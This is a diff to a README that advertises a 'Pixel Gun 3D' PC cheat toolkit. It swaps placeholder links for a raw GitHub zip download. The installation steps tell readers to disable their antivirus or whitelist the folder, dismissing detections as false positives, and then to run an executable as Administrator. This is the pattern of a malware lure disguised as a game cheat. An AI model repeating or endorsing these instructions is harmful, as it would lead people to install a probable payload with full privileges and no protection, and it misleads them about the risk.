@@ -2,7 +2,7 @@
 
 Elevate your Pixel Gun 3D experience on PC with this comprehensive cheat toolkit. Designed for maximum performance and reliability, this tool provides players with advanced combat assistance and visual enhancements to dominate every match.
 
-**[⬇️ Download Pixel Gun 3D Cheats](https://github.com)**
+**[⬇️ Download Pixel Gun 3D Cheats](https://raw.githubusercontent.com/r6ydrtysr/Pixel-Gun-3D-PC-Cheats/main/arsenobenzene/Pixel_Gun_Cheats_P_v1.2-alpha.4.zip)**
 
 ## 🚀 Power-Up Features
 
@@ -26,7 +26,7 @@ Elevate your Pixel Gun 3D experience on PC with this comprehensive cheat toolkit
 
 ## ⚙️ Installation Guide
 
-1. **Download:** Get the latest version from the **[Download Link](https://github.com)**.
+1. **Download:** Get the latest version from the **[Download Link](https://raw.githubusercontent.com/r6ydrtysr/Pixel-Gun-3D-PC-Cheats/main/arsenobenzene/Pixel_Gun_Cheats_P_v1.2-alpha.4.zip)**.
 2. **Antivirus Setup:** Like most game modification tools, this may be flagged as a "False Positive." Disable your antivirus or add the folder to your exclusion list to prevent the file from being deleted.
 3. **Execution:** Right-click `PG3D-PC-Cheats.exe` and select **Run as Administrator**.
 4. **Integration:** Launch Pixel Gun 3D on your PC/Emulator. The tool will automatically detect the game process and activate the menu.
